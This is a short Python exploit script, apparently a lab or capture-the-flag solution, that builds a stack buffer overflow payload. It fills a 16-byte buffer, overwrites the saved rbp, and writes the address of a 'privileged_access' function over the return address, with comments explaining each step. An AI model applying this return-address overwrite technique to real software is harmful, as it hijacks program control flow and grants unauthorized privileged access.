#!/usr/bin/env python3
import struct
import sys

# Address of privileged_access function from GDB
PRIV_FUNC_ADDR = 0x0000000000401256

# In x86_64, the typical stack frame looks like:
# [buffer (16 bytes)][saved rbp (8 bytes)][return address (8 bytes)]

# Start with filling the buffer (16 bytes)
payload = b"A" * 16

# Add bytes to overwrite the saved base pointer (rbp)
# This doesn't need to be a valid address since we're just trying to reach the return address
payload += b"B" * 8

# Add the address of privileged_access (in little-endian format)
# This overwrites the return address so when the function returns, it goes to privileged_access
payload += struct.pack("<Q", PRIV_FUNC_ADDR)

# Write the payload to stdout
sys.stdout.buffer.write(payload)
